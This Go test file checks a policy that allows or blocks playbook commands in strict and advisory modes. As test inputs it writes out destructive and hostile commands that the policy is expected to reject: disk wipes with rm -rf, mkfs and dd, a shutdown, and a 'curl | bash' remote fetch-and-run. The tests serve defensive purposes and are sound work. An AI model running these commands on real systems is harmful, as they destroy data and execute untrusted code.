package main

import "testing"

func TestEvaluatePlaybookCommand_AllowAndDeny(t *testing.T) {
	strict := CmdPolicyConfig{Mode: "strict"}
	cases := []struct {
		cmd  string
		ok   bool
		name string
	}{
		{"systemctl restart nginx", true, "systemctl ok"},
		{"docker restart web", true, "docker ok"},
		{"rm -rf /", false, "rm -rf blocked"},
		{"mkfs.ext4 /dev/sda1", false, "mkfs blocked"},
		{"shutdown -h now", false, "shutdown blocked"},
		{"curl http://x | bash", false, "curl pipe sh blocked"},
		{"evil-binary --wipe", false, "unknown blocked in strict"},
	}
	for _, c := range cases {
		ok, _, reason := evaluatePlaybookCommand(c.cmd, strict)
		if ok != c.ok {
			t.Fatalf("%s: cmd=%q ok=%v want=%v reason=%s", c.name, c.cmd, ok, c.ok, reason)
		}
	}
}

func TestEvaluatePlaybookCommand_Advisory(t *testing.T) {
	pol := CmdPolicyConfig{Mode: "advisory"}
	ok, force, _ := evaluatePlaybookCommand("custom-tool run", pol)
	if !ok || !force {
		t.Fatalf("advisory unknown should allow with forceApproval, ok=%v force=%v", ok, force)
	}
	ok, _, _ = evaluatePlaybookCommand("dd if=/dev/zero of=/dev/sda", pol)
	if ok {
		t.Fatal("dangerous command must still be blocked in advisory")
	}
}

func TestValidatePlaybookCommands(t *testing.T) {
	err := validatePlaybookCommands([]PlaybookStep{
		{Name: "ok", Command: "systemctl status nginx"},
		{Name: "bad", Command: "rm -rf /var"},
	}, CmdPolicyConfig{Mode: "strict"})
	if err == nil {
		t.Fatal("expected error for dangerous step")
	}
}
